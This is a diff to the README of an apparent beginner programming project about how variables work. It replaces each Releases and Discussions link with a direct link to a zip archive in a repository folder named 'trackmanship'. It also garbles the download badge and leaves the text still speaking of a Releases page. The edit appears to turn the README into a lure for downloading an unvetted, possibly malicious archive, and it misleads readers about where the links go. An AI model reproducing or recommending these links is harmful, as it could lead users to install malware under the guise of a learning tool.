@@ -1,6 +1,6 @@
 # 🧪 exploring-the-true-nature-of-variable - Discover How Data Works
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/releases)
+[![Download](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to "exploring-the-true-nature-of-variable". This application provides a 
 
 To get started, visit the following page to download the application:
 
-[Download Here](https://github.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/releases)
+[Download Here](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip)
 
 Once you are on the Releases page, choose the latest release. Click on the appropriate file for your operating system to download it. 
 
@@ -70,8 +70,8 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 Join the community to learn more about programming concepts and share your experiences. Engage with others who are also exploring the world of low-level programming.
 
-Visit the [GitHub Discussions](https://github.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/discussions) to participate.
+Visit the [GitHub Discussions](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip) to participate.
 
 For another chance to download the application, visit the following link again:
 
-[Download Here](https://github.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/releases)
+[Download Here](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip)
